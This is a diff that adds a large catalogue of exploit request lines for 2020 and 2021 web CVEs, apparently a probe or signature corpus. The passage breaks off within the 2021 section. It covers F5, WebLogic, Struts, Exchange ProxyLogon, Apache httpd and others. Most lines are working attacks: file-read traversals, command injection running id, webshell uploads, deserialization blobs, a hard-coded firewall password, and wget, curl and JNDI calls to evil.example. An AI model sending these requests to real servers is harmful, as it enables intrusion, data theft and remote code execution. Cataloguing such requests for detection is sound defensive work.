@@ -850,3 +850,1225 @@ MOVE /dav/ header="Destination: /dav/sub/"
 #   CVE-2026-93952 (Arista VeloCloud), CVE-2026-94127 (F5 BIG-IP APM),
 #   CVE-2026-102489 (Zammad), CVE-2026-104286 (FortiMail): public request
 #   shapes are missing or appliance-specific.
+
+# ---------------------------------------------------------------------------
+# 2020 CVEs: attacks against HTTP servers and web frameworks.
+#
+# Grouped by advisory family. Requests that cannot be expressed as a single
+# request line (binary bodies, connection-level framing) are summarized at the end.
+# ---------------------------------------------------------------------------
+
+# --- CVE-2020-5902 (F5 BIG-IP TMUI, KEV): unauthenticated file read and
+#     command execution reachable through the '/..;/' path normalization flaw.
+#     The public PoC (Critical Start, PT Swarm, Nuclei CVE-2020-5902) uses
+#     the login.jsp prefix and the locallb workspace JSPs. ---
+GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
+GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf
+GET /tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/tmp
+POST /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp body="command=list auth user"
+POST /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp body="command=create cli alias private list command bash"
+POST /tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp body="fileName=/tmp/poc&content=id"
+
+# --- CVE-2020-3452 (Cisco ASA/FTD, KEV): read-only path traversal in the
+#     WebVPN web services file system (Nuclei CVE-2020-3452, packetstorm). ---
+GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+GET /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
+
+# --- CVE-2020-14750, CVE-2020-14882, CVE-2020-14883 (Oracle WebLogic Server,
+#     KEV): console authorization bypass plus the handle= expression and
+#     FileSystemXmlApplicationContext execution paths (Nuclei CVE-2020-14750,
+#     CVE-2020-14882; testbnull writeup). ---
+GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1
+GET /console/images/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%27http://evil.example/rce.xml%27)
+POST /console/css/%252e%252e%252fconsole.portal body="_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('id')\")"
+
+# --- CVE-2020-6287 (SAP NetWeaver AS Java RECON, KEV): the unauthenticated
+#     LM Configuration Wizard executes the SPC_UserManagement configuration
+#     task and creates an admin user (Onapsis, Nuclei CVE-2020-6287). The
+#     baData base64 prefix is carried here; the full envelope exceeds the
+#     line-length limit and lives in the Nuclei template. ---
+POST /CTCWebService/CTCWebServiceBean/ConfigServlet header="Content-Type: text/xml; charset=UTF-8" body="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:urn=\"urn:CTCWebServiceSi\"><soapenv:Body><urn:executeSynchronious><identifier><component>sap.com/tc~lm~config~content</component><path>content/Netweaver/ASJava/NWA/SPC/SPC_UserManagement.cproc</path></identifier><contextMessages><baData>CiAgICAgICAgICAgIDxQQ0s+CiAgICAgICAgICAgIDxVc2VybWFuYWdlbWVudD4KICAgICAgICAgICAgICA8U0FQX1hJX1BDS19DT05GSUc+CiAgICAgICAgICAgICAgICA8cm9sZU5hbWU+QWRtaW5pc3RyYXRvcjwvcm9sZU5hbWU+CiAgICAgICAgICAgICAgPC9TQVBfWElfUENLX0NPTkZJRz4KICAgICAgICAgICAgICA8U0FQX1hJX1BDS19DT01NVU5JQ0FUSU9OPgogICAgICAgICAgICAgICAgPHJvbGVOYW1lPlRoaXNJ</baData><name>userDetails</name></contextMessages></urn:executeSynchronious></soapenv:Body></soapenv:Envelope>"
+
+# --- CVE-2020-5410 (Spring Cloud Config Server, KEV): directory traversal in
+#     the native profile serves arbitrary files (Nuclei CVE-2020-5410).
+#     CVE-2020-5405 is the same class but scores 6.5, below the 7.0 cut. ---
+GET /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development
+GET /..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%23foo/development
+
+# --- CVE-2020-17518, CVE-2020-17519 (Apache Flink, KEV for 17519): jar upload
+#     writes outside the upload directory through the multipart filename, and
+#     the jobmanager logs handler reads arbitrary files (Nuclei templates). ---
+GET /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+POST /jars/upload header="Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y" body="Content-Disposition: form-data; name=\"jarfile\"; filename=\"../../../../../../../tmp/poc\""
+
+# --- CVE-2020-9484 (Apache Tomcat): session persistence deserialization when
+#     a relative JSESSIONID resolves to an attacker-planted file (Nuclei).
+#     CVE-2020-1938 (Ghostcat/AJP) and CVE-2020-13934/13935 (h2c and WebSocket
+#     frame handling) cannot be expressed as HTTP requests; see the summary. ---
+GET /index.jsp header="Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy"
+GET /index.jsp header="Cookie: JSESSIONID=../../../../../../tmp/tomcat-poc"
+
+# --- CVE-2020-10199, CVE-2020-10204 (Sonatype Nexus Repository, KEV): JavaEL
+#     injection in repository member names and in the user-update RPC reaches
+#     process execution (Nuclei CVE-2020-10199, CVE-2020-10204). ---
+POST /service/rapture/session header="Content-Type: application/x-www-form-urlencoded; charset=UTF-8" body="username=YWRtaW4=&password=YWRtaW4="
+POST /service/rest/beta/repositories/bower/group header="NX-ANTI-CSRF-TOKEN: 1" header="Cookie: NX-ANTI-CSRF-TOKEN=1" header="Content-Type: application/json" body="{\"name\": \"internal\", \"online\": \"true\", \"storage\": {\"blobStoreName\": \"default\", \"strictContentTypeValidation\": \"true\"}, \"group\": {\"memberNames\": [\"$\\\\A{3*3333}\"]}}"
+POST /service/extdirect header="NX-ANTI-CSRF-TOKEN: 1" header="Cookie: NX-ANTI-CSRF-TOKEN=1" header="X-Nexus-UI: true" header="Content-Type: application/json" body="{\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"userId\":\"admin\",\"version\":\"2\",\"firstName\":\"admin\",\"lastName\":\"User\",\"email\":\"admin@example.org\",\"status\":\"active\",\"roles\":[\"nx-admin$\\\\B{3*3333}\"]}],\"type\":\"rpc\",\"tid\":11}"
+
+# --- CVE-2020-17496 (vBulletin, KEV): widget_tabbedcontainer_tab_panel
+#     renders a nested widget_php whose config code executes PHP; this is the
+#     bypass of the CVE-2019-16759 fix (exploitee.rs, Nuclei CVE-2020-17496). ---
+POST /ajax/render/widget_tabbedcontainer_tab_panel header="Content-Type: application/x-www-form-urlencoded" body="subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec('id'); exit;"
+POST /ajax/render/widget_php header="Content-Type: application/x-www-form-urlencoded" body="widgetConfig[code]=echo shell_exec('id'); exit;"
+
+# --- CVE-2020-10148 (SolarWinds Orion, KEV): the .i18n.ashx handlers bypass
+#     API authentication and return configuration files (Nuclei). ---
+GET /web.config.i18n.ashx?l=x&v=x
+GET /SWNetPerfMon.db.i18n.ashx?l=x&v=x
+
+# --- CVE-2020-17530 (Apache Struts S2-061, KEV): forced double OGNL
+#     evaluation in a tag attribute executes freemarker Execute. Payload as
+#     published in the Nuclei template CVE-2020-17530. ---
+GET /?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D
+
+# --- CVE-2020-35476 (OpenTSDB): the yrange parameter is written into a
+#     gnuplot script and executed (GHSL-2020-118, Nuclei CVE-2020-35476). ---
+GET /q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=%5B33:system(%27wget%20http://evil.example/x%27)%5D&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
+GET /q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&yrange=%5B1:system(%27id%27)%5D&wxh=100x100&json
+
+# --- CVE-2020-15227 (Nette Framework): the nette.micro callback parameter
+#     invokes arbitrary PHP functions (Nuclei CVE-2020-15227). ---
+GET /nette.micro/?callback=phpcredits
+GET /nette.micro/?callback=phpinfo
+
+# --- CVE-2020-25223 (Sophos SG UTM WebAdmin, KEV): unauthenticated command
+#     execution through the SID field of the /var JSON-RPC endpoint (Nuclei,
+#     darrenmartyn PoC). ---
+POST /var header="X-Requested-With: XMLHttpRequest" header="Content-Type: application/json; charset=UTF-8" body="{\"objs\": [{\"FID\": \"init\"}], \"SID\": \"|id|\", \"browser\": \"gecko_linux\", \"backend_version\": -1, \"loc\": \"\", \"_cookie\": null, \"wdebug\": 0, \"RID\": \"1629210675639_0.5000855117488202\", \"current_uuid\": \"\", \"ipv6\": true}"
+
+# --- CVE-2020-8515, CVE-2020-15415 (DrayTek Vigor routers, KEV): shell
+#     metacharacters in the mainfunction keyPath and in a cvmcfgupload
+#     filename execute as root (Nuclei CVE-2020-8515, CVE-2020-15415). ---
+POST /cgi-bin/mainfunction.cgi body="action=login&keyPath=%27%0A%2fbin%2fid%0A%27&loginUser=a&loginPwd=a"
+POST /cgi-bin/mainfunction.cgi/cvmcfgupload?1=2 header="Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" body="Content-Disposition: form-data; name=\"abc\"; filename=\"t';id;echo '1_\""
+
+# --- CVE-2020-9377 (D-Link DIR-610, KEV): remote command execution through
+#     the cmd parameter of command.php (NVD description, D-Link SAP10182). ---
+GET /command.php?cmd=id
+GET /command.php?cmd=reboot
+
+# --- CVE-2020-25078 (D-Link DCS-2530L/DCS-2670L, KEV): /config/getuser
+#     discloses the administrator name and password without authentication
+#     (Nuclei CVE-2020-25078). ---
+GET /config/getuser?index=0
+
+# --- CVE-2020-9054, CVE-2020-29583 (ZyXEL NAS and firewalls, KEV):
+#     pre-authentication command injection in weblogin.cgi reaches a shell,
+#     and a hard-coded support account exists in the firewall firmware
+#     (Nuclei CVE-2020-9054, CVE-2020-29583). ---
+GET /cgi-bin/weblogin.cgi?username=admin%27;cat%20/etc/passwd
+GET /?username=zyfwp&password=PrOw!aN_fXp
+
+# --- CVE-2020-10987 (Tenda AC15, KEV): command substitution in deviceName of
+#     goform/setUsbUnload executes as root (Nuclei CVE-2020-10987). ---
+POST /goform/setUsbUnload header="Content-Type: application/x-www-form-urlencoded" body="deviceName=test`;id;`"
+
+# --- CVE-2020-26919 (NETGEAR JGS516PE, KEV): the hidden debug command in
+#     login.htm accepts arbitrary commands (Nuclei CVE-2020-26919). ---
+POST /login.htm body="submitId=debug&debugCmd=wget+http://evil.example/x&submitEnd="
+
+# --- CVE-2020-16139 (Cisco Unified IP Conference Station 7937G, KEV):
+#     a single crafted localmenus.cgi request restarts the device. Listed
+#     because it is request-shaped, although the impact is denial of service
+#     (Nuclei CVE-2020-16139). ---
+POST /localmenus.cgi?func=609&rphl=1&data=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+# --- CVE-2020-25213 (WordPress File Manager plugin, KEV): the elFinder
+#     connector allows unauthenticated uploads that execute as PHP (Nuclei). ---
+POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php header="Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" body="Content-Disposition: form-data; name=\"upload[]\"; filename=\"shell.php\""
+POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php header="Content-Type: application/x-www-form-urlencoded" body="cmd=upload&target=l1_Lw"
+
+# --- CVE-2020-11738 (WordPress Duplicator plugin, KEV): the
+#     duplicator_download action serves files outside the backup directory
+#     (Nuclei CVE-2020-11738). ---
+GET /wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+GET /wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php
+
+# --- CVE-2020-24186 (WordPress wpDiscuz plugin, KEV): wmuUploadFiles accepts
+#     a .php attachment without authentication (Nuclei CVE-2020-24186). ---
+POST /wp-admin/admin-ajax.php header="X-Requested-With: XMLHttpRequest" header="Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" body="Content-Disposition: form-data; name=\"wmu_files[0]\"; filename=\"rce.php\""
+
+# --- CVE-2020-35489 (WordPress Contact Form 7): the upload filter failed to
+#     reject specific characters in filenames, so a .php file can be attached
+#     through the form feedback endpoint (WPScan 10508, GetAstra writeup). ---
+POST /wp-json/contact-form-7/v1/contact-forms/1/feedback header="Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" body="Content-Disposition: form-data; name=\"file-1\"; filename=\"shell.php\""
+
+# --- CVE-2020-7961 (Liferay Portal, KEV): JSONWS unmarshalling of a
+#     WrapperConnectionPoolDataSource reaches a deserialization gadget
+#     (Nuclei CVE-2020-7961). The HexAscii map is shortened to fit the line
+#     limit; the keywords remain the signature. ---
+POST /api/jsonws/invoke header="Content-Type: application/x-www-form-urlencoded" body="cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=x&formDate=1597704739243&tableId=1&name=A&type=1&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3AACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B"
+
+# --- CVE-2020-1947 (Apache ShardingSphere UI): SnakeYAML parses a
+#     JdbcRowSetImpl dataSourceConfiguration and triggers a JNDI lookup
+#     (wsfengfan PoC, jas502n writeup). The Access-Token header is the UI
+#     session token. ---
+POST /api/schema header="Content-Type: application/json;charset=utf-8" header="Access-Token: token" body="{\"name\":\"poc\",\"ruleConfiguration\":\"\",\"dataSourceConfiguration\":\"!!com.sun.rowset.JdbcRowSetImpl\\n  dataSourceName: ldap://evil.example:1389/x\\n  autoCommit: true\"}"
+
+# --- CVE-2020-1956 (Apache Kylin, KEV): cube management REST paths
+#     concatenate the cube name into a shell command (Nuclei CVE-2020-1956). ---
+POST /kylin/api/cubes/kylin_streaming_cube/%2031%60curl%20http://evil.example/x%60/migrate header="Content-Type: application/x-www-form-urlencoded"
+POST /kylin/api/cubes/kylin_streaming_cube/%2031%60id%60/migrate header="Content-Type: application/x-www-form-urlencoded"
+
+# --- CVE-2020-11975, CVE-2020-13942 (Apache Unomi): OGNL and MVEL
+#     expressions in profile conditions execute through /context.json
+#     (Nuclei CVE-2020-11975, CVE-2020-13942). ---
+POST /context.json header="Content-Type: application/json" body="{\"filters\":[{\"id\":\"poc\",\"filters\":[{\"condition\":{\"parameterValues\":{\"poc\":\"script::Runtime.getRuntime().exec('id')\"},\"type\":\"profilePropertyCondition\"}}]}],\"sessionId\":\"poc\"}"
+POST /context.json header="Content-Type: application/json" body="{\"personalizations\":[{\"id\":\"poc\",\"strategy\":\"matching-first\",\"strategyOptions\":{\"fallback\":\"var2\"},\"contents\":[{\"filters\":[{\"condition\":{\"parameterValues\":{\"propertyName\":\"(#r=@java.lang.Runtime@getRuntime()).(#r.exec(\\\"id\\\"))\",\"comparisonOperator\":\"equals_anystr\",\"propertyValue\":\"male_anystr\"},\"type\":\"profilePropertyCondition\"}}]}]}],\"sessionId\":\"poc\"}"
+
+# --- CVE-2020-16846 (SaltStack Salt API, KEV): ssh_priv is interpolated into
+#     a shell command and eauth is bypassed (F-Secure advisory, Metasploit
+#     saltstack_salt_api_cmd_exec). ---
+POST /run header="Content-Type: application/json" body="{\"client\":\"ssh\",\"tgt\":\"*\",\"fun\":\"cmd.run\",\"eauth\":\"x\",\"ssh_priv\":\"/dev/null < /dev/null & (id) & #\"}"
+
+# --- CVE-2020-15505 (MobileIron Core, KEV): unauthenticated Hessian
+#     deserialization through the '.;' servlet path (Nuclei CVE-2020-15505). ---
+POST /mifs/.;/services/LogService header="Content-Type: x-application/hessian" bodyhex=630200480004
+POST /mifs/.;/services/LogService header="Content-Type: application/x-hessian" bodyhex=630200480004
+
+# --- CVE-2020-0688 (Microsoft Exchange, KEV): the static machine key lets a
+#     crafted __VIEWSTATE deserialize through ecp/default.aspx (ZDI-20-258,
+#     zcgonvh PoC). The blob is truncated after the .NET ViewState magic. ---
+GET /ecp/default.aspx?__VIEWSTATE=AAEAAAD%2F%2F%2F%2F%2F%2F%2F%2F&__VIEWSTATEGENERATOR=2C40FCE0
+
+# --- CVE-2020-4427 (IBM Data Risk Manager, KEV): the albatross SAML endpoint
+#     bypasses authentication; CVE-2020-4428 then needs SSH access, so only
+#     the bypass shape is listed (Nuclei CVE-2020-4427). ---
+GET /albatross/saml/idpSelection?id=x&userName=admin
+
+# --- CVE-2020-13927, CVE-2020-11978 (Apache Airflow, KEV): the experimental
+#     API answers without authentication and the example trigger DAG passes
+#     conf.message into a BashOperator (Nuclei templates). ---
+GET /api/experimental/latest_runs
+POST /api/experimental/dags/example_trigger_target_dag/dag_runs header="Content-Type: application/json" body="{\"conf\": {\"message\": \"\"; touch /tmp/pwn #\"}}"
+
+# --- CVE-2020-6207 (SAP Solution Manager, KEV): the EEM admin SOAP service
+#     answers unauthenticated and reaches all connected SMDAgents (Nuclei). ---
+POST /EemAdminService/EemAdmin header="SOAPAction: \"\"" header="Content-Type: text/xml; charset=UTF-8" body="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:adm=\"http://sap.com/smd/eem/admin/\"><soapenv:Body><adm:getAllAgentInfo/></soapenv:Body></soapenv:Envelope>"
+
+# --- CVE-2020-14864 (Oracle Business Intelligence, KEV): the preview image
+#     handler reads arbitrary files without authentication (Nuclei). ---
+GET /analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd
+GET /analytics/saw.dll?bieehome&startPage=1
+
+# --- CVE-2020-8644 (PlaySMS, KEV): the login handler renders a template
+#     expression supplied as the username (Nuclei CVE-2020-8644). ---
+POST /index.php?app=main&inc=core_auth&route=login&op=login header="Content-Type: application/x-www-form-urlencoded" body="X-CSRF-Token=x&username=%7B%7B%60id%60%7D%7D&password="
+
+# --- CVE-2020-5722 (Grandstream UCM6200, KEV): unauthenticated SQL injection
+#     with command execution in the sendPasswordEmail action (Nuclei). ---
+POST /cgi? header="Content-Type: application/x-www-form-urlencoded; charset=UTF-8" body="action=sendPasswordEmail&user_name=admin'+or+1=1--`;`id`;`"
+
+# --- CVE-2020-17463 (Fuel CMS, KEV): SQL injection in the col parameter of
+#     the list endpoints (Nuclei CVE-2020-17463). ---
+GET /fuel/pages/items/?col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0
+
+# --- CVE-2020-5847 (Unraid, KEV): injecting PHP through the site[x][text]
+#     parameter reaches the plugin render path; CVE-2020-5849 is the
+#     companion authentication bypass (Nuclei CVE-2020-5847). ---
+GET /webGui/images/green-on.png/?path=x&site[x][text]=%3C?php%20echo%20md5(%22poc%22);%20?%3E
+
+# --- CVE-2020-7796 (Zimbra Collaboration Suite, KEV 2026 intake): SSRF
+#     through the WebEx zimlet httpPost.jsp companyId parameter (Nuclei). ---
+GET /zimlet/com_zimbra_webex/httpPost.jsp?companyId=http://evil.example/%23
+
+# --- CVE-2020-10189 (Zoho ManageEngine Desktop Central, KEV):
+#     unauthenticated Java deserialization through the MDM log uploader with
+#     a traversal UDID, triggered by the cewolf image servlet (Nuclei). The
+#     body carries the serialization magic; the gadget stream is truncated. ---
+POST /mdm/client/v1/mdmLogUploader?udid=si%5C..%5C..%5C..%5Cwebapps%5CDesktopCentral%5C_chart&filename=logger.zip header="Content-Type: application/octet-stream" bodyhex=aced000573720011
+GET /cewolf/?img=%5Clogger.zip
+
+# --- 2020 attack classes left out ---
+# CVE-2020-1938 (Tomcat Ghostcat), CVE-2020-13934/13935 (Tomcat h2c upgrade
+#   and WebSocket frame handling), CVE-2020-2551/2555/2883/14644 (WebLogic
+#   T3/IIOP), CVE-2020-11651/11652 (Salt ZeroMQ): non-HTTP protocols or
+#   connection-level framing; no request line can express them.
+# CVE-2020-8193/8195/8196 (Citrix ADC/Gateway, KEV): the chain is
+#   unauthenticated file read with public probes such as
+#   /pcidss/report?type=allprofiles&... and /rapi/filedownload?filter=path:
+#   but every CVE in the family scores below the 7.0 cut (6.5/6.5/4.3).
+# CVE-2020-5405 (Spring Cloud Config, 6.5), CVE-2020-26258/26259 (XStream,
+#   6.3/6.8): below the CVSS 7.0 cut and/or the payload is an XML body with a
+#   converter class name, not a request-shaped attack.
+# CVE-2020-11022/11023 (jQuery): client-side DOM handling; no server request
+#   signature. CVE-2020-3580 (Cisco ASA, KEV): reflected client-side script.
+# CVE-2020-17144 (Exchange EWS) and CVE-2020-1147/16952 (SharePoint) and
+#   CVE-2020-0646 (.NET): the exploit is a serialized object inside a SOAP or
+#   ViewState envelope; the only stable signature is the generic __VIEWSTATE
+#   probe already listed for CVE-2020-0688.
+# CVE-2020-2021 (PAN-OS SAML, KEV): exploitation needs a SAMLResponse whose
+#   signature relationship to the IdP certificate is tampered, which is
+#   indistinguishable from a legitimate POST to /SAML20/SP/ACS without IdP
+#   trust material.
+# CVE-2020-12271 / CVE-2020-15069 (Sophos XG Firewall) and CVE-2020-29574
+#   (CyberoamOS): KEV-listed, but no public request shape was found in this
+#   pass; exploitation details remain vendor-side.
+# CVE-2020-5135 (SonicOS), CVE-2020-3259 / CVE-2020-3161 (Cisco ASA and IP
+#   Phones), CVE-2020-8599 / CVE-2020-8467 (Trend Micro), CVE-2020-13671
+#   (Drupal), CVE-2020-4006 (VMware), CVE-2020-15888 (Lua): memory-corruption
+#   or configuration-injection bugs without a reproducible request shape, or
+#   local/library flaws.
+# CVE-2020-24363 (TP-Link TL-WA855RE): adjacent network (AV:A) factory reset.
+# CVE-2020-35489 (Contact Form 7): the bypass uses characters in the uploaded
+#   filename that depend on the form configuration; the probe carries the CF7
+#   feedback endpoint with a .php filename.
+
+# ---------------------------------------------------------------------------
+# 2021 CVEs: attacks against HTTP servers and web frameworks.
+#
+# Grouped by advisory family. Requests that cannot be expressed as a single
+# request line (binary bodies, connection-level framing) are summarized at the end.
+# ---------------------------------------------------------------------------
+
+# --- CVE-2021-26855 / CVE-2021-26857 / CVE-2021-26858 / CVE-2021-27065
+#     (Microsoft Exchange ProxyLogon, KEV): the Client Access front end proxies
+#     attacker-chosen backend requests through the X-BEResource cookie, and the
+#     chain ends with a webshell write through ResetOABVirtualDirectory. ---
+GET /ecp/kj4.js header="Cookie: X-BEResource=localhost~1942062522"
+POST /ecp/kj4.js header="Cookie: X-BEResource=EXCHANGE/autodiscover/autodiscover.xml?a=~1942062522;" header="Content-Type: text/xml" body="<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\"><Request><EMailAddress>administrator@example.com</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>"
+GET /owa/auth/x.js header="Cookie: X-AnonResource=true; X-AnonResource-Backend=evil.example/ecp/default.flt?~3;"
+POST /ecp/kj4.js header="Cookie: X-BEResource=Admin@EXCHANGE:444/ecp/proxyLogon.ecp?a=~1942062522;" header="Content-Type: text/xml" body="<r at=\"Negotiate\" ln=\"john\"><s>S-1-5-21-1111111111-2222222222-3333333333-500</s><s a=\"7\" t=\"1\">S-1-1-0</s><s a=\"7\" t=\"1\">S-1-5-2</s><s a=\"7\" t=\"1\">S-1-5-11</s><s a=\"7\" t=\"1\">S-1-5-15</s></r>"
+POST /ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=1 header="Cookie: X-BEResource=Admin@EXCHANGE:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=1&a=~1942062522;" header="Content-Type: application/json; charset=utf-8" bodyhex=7b226964656e74697479223a7b225f5f74797065223a224964656e746974793a454350222c22446973706c61794e616d65223a224f4142202844656661756c7420576562205369746529222c225261774964656e74697479223a2231227d2c2270726f70657274696573223a7b22506172616d6574657273223a7b225f5f74797065223a224a736f6e44696374696f6e6172794f66616e79547970653a234d6963726f736f66742e45786368616e67652e4d616e6167656d656e742e436f6e74726f6c50616e656c222c2246696c65506174684e616d65223a225c5c5c5c3132372e302e302e315c5c63245c5c50726f6772616d2046696c65735c5c4d6963726f736f66745c5c45786368616e6765205365727665725c5c5631355c5c46726f6e74456e645c5c4874747050726f78795c5c6f77615c5c617574685c5c61686968692e61737078227d7d7d
+
+# --- CVE-2021-34473 / CVE-2021-34523 / CVE-2021-31207 (Microsoft Exchange
+#     ProxyShell, KEV): the autodiscover endpoint reaches the CAS backend with an
+#     attacker-chosen mailbox path; the RCE step needs PowerShell against that
+#     session, so only the pre-auth reachability probes are listed. ---
+GET /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
+GET /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com
+POST /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com header="Content-Type: application/mapi-http"
+
+# --- CVE-2021-33766 (Microsoft Exchange ProxyToken, KEV): the ECP backend
+#     trusts a request that arrives with an empty SecurityToken cookie. ---
+GET /ecp/admin@example.com/PersonalSettings/HomePage.aspx?showhelp=false header="Cookie: SecurityToken=x"
+POST /ecp/admin@example.com/RulesEditor/InboxRules.svc/NewObject?msExchEcpCanary=1 header="Cookie: SecurityToken=x" header="Content-Type: application/json; charset=utf-8" body="{\"properties\":{\"RedirectTo\":[{\"RawIdentity\":\"attacker@evil.example\",\"DisplayName\":\"attacker\",\"Address\":\"attacker@evil.example\",\"AddressOrigin\":0,\"RoutingType\":\"SMTP\"}],\"Name\":\"Pwn\",\"StopProcessingRules\":true}}"
+
+# --- CVE-2021-41773 (Apache httpd 2.4.49 path traversal, KEV): encoded dot
+#     segments escape the document root; with cgi-bin enabled the request body
+#     executes through /bin/sh. ---
+GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
+GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+GET /.%2e/.%2e/.%2e/.%2e/etc/passwd
+POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh header="Content-Type: application/x-www-form-urlencoded" body="echo Content-Type: text/plain; echo; id"
+
+# --- CVE-2021-42013 (Apache httpd 2.4.50, KEV): the 41773 fix is bypassed with
+#     double-encoded dot segments (%%32%65 decodes to %2e, then to '.'). ---
+GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh header="Content-Type: application/x-www-form-urlencoded" body="echo Content-Type: text/plain; echo; id"
+
+# --- CVE-2021-40438 (Apache httpd mod_proxy SSRF, KEV): a uri-path carrying
+#     'unix:' and '|' makes mod_proxy forward the request to an attacker-chosen
+#     origin. The public PoC pads the path to about 7700 bytes; the probe keeps
+#     the shape short enough for the corpus line limit. ---
+GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://evil.example/
+
+# --- CVE-2021-26084 (Atlassian Confluence OGNL injection, KEV): the
+#     queryString parameter of the page-creation actions reaches an OGNL
+#     evaluation (the plain arithmetic form is the public PoC). ---
+POST /pages/doenterpagevariables.action header="Content-Type: application/x-www-form-urlencoded" body="queryString=aaaa%5cu0027%2b%7b16*8787%7d%2b%5cu0027bbb"
+POST /pages/createpage-entervariables.action?SpaceKey=x header="Content-Type: application/x-www-form-urlencoded" body="queryString=aaaa%5cu0027%2b%7b16*8787%7d%2b%5cu0027bbb"
+POST /confluence/pages/createpage-entervariables.action header="Content-Type: application/x-www-form-urlencoded" body="queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027"
+
